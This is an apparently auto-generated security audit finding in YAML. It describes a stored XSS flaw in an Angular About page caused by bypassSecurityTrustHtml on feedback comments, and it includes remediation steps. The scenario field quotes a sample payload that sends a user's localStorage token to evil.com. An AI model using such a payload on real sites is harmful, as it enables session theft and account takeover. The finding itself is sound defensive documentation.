- local_id: frontend-spa-002
  threat_category_id: TH-11
  additional_categories: []
  stride: Tampering
  cwe: CWE-79
  title: Cross-Site Scripting — about.component.ts:119
  affected_parameter: feedbacks[i].comment
  scenario: The About page loads all customer feedback from the backend via FeedbackService.find(). For each feedback record,
    about.component.ts:116-119 wraps the raw server-supplied comment string in HTML markup and then passes it through sanitizer.bypassSecurityTrustHtml(),
    which explicitly instructs Angular's DomSanitizer to skip all sanitization. The trusted HTML is then added to the gallery
    slideshow. Any user who submitted a feedback containing a payload such as '<img src=x onerror=fetch(`https://evil.com/?t=${localStorage.getItem("token")}`)>'
    will have that script execute in the browser of every user who visits the About page.
  evidence_summary: sanitizer.bypassSecurityTrustHtml(feedbacks[i].comment) at about.component.ts:119 marks arbitrary server-retrieved
    HTML as safe, disabling Angular's XSS sanitization for all feedback comments.
  impact_description: Stored XSS payload in any feedback comment executes in every visitor's browser, enabling session token
    theft, account takeover, or arbitrary DOM manipulation.
  likelihood: High
  impact: Critical
  risk: Critical
  controls_in_place: Angular DomSanitizer present but explicitly bypassed at this call site.
  mitigation_title: Remove bypassSecurityTrustHtml and sanitize feedback HTML before rendering
  remediation:
    effort: Low
    steps:
    - Remove the bypassSecurityTrustHtml() call at about.component.ts:119. Use Angular's default safe HTML rendering or render
      only the text content via Angular interpolation ({{ feedbacks[i].comment }}) to avoid HTML injection entirely.
    - If star-rating HTML is required (the <i class='fas fa-star'> markup at lines 58-63), generate it server-side or use
      Angular template syntax with NgFor over a fixed rating array rather than injecting raw HTML strings.
    - Add a Content Security Policy header (script-src 'self'; object-src 'none') at the Express server level to limit damage
      from any remaining XSS surface.
    code_example: '// BEFORE (vulnerable)

      feedbacks[i].comment = this.sanitizer.bypassSecurityTrustHtml(feedbacks[i].comment)


      // AFTER (safe — render comment as plain text only)

      // In template: <p class="feedback-comment">{{ feedback.comment }}</p>

      // Stars rendered via Angular template, not innerHTML'
    reference: CWE-79
    blueprint: null
